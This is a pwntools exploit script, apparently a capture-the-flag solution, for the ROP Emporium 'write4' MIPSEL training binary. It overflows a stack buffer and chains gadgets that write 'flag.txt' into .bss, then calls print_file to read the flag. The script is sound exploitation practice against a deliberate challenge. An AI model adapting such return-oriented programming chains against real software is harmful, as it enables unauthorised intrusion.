#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time


# ROPemporium write4 MIPSEL

# Set up pwntools for the correct architecture
elf = context.binary = ELF('write4_mipsel')
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]

gs='''
b *pwnme+296
c
'''

# Gadgets
# lw $t9, 0xc($sp) ; lw $t0, 8($sp) ; lw $t1, 4($sp) ; sw $t1, ($t0) ; jalr $t9 ; addi $sp, $sp, 0x10
g_write = 0x00400930

# lw $a0, 8($sp) ; lw $t9, 4($sp) ; jalr $t9 ; nop
g_set_a0_and_call = 0x00400948

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])


print_file = elf.plt["print_file"]
bssaddr = elf.get_section_by_name('.bss').header['sh_addr']

log.info(f"{bssaddr=:x}")
log.info(f"{print_file=:x}")

offset=0x24

PL=b"A"*offset
# first gadget write "flag"
PL+=p32(g_write)    
PL+=p32(0xdeadbeef)        # junk
PL+=b'flag'                # t1
PL+=p32(bssaddr)           # t0
PL+=p32(g_write)           # t9 => next gadget

# Second gadget write ".txt"
PL+=p32(0xf00df00d) 	   # junk
PL+=b'.txt'                # t1
PL+=p32(bssaddr+4)         # t0
PL+=p32(g_set_a0_and_call) # t9 => next gadget

# call print_file(@.bss)
PL+=p32(0xdeadbeef)        # junk
PL+=p32(print_file)         # t9
PL+=p32(bssaddr)            # a0

io.sendlineafter(b"> ",PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

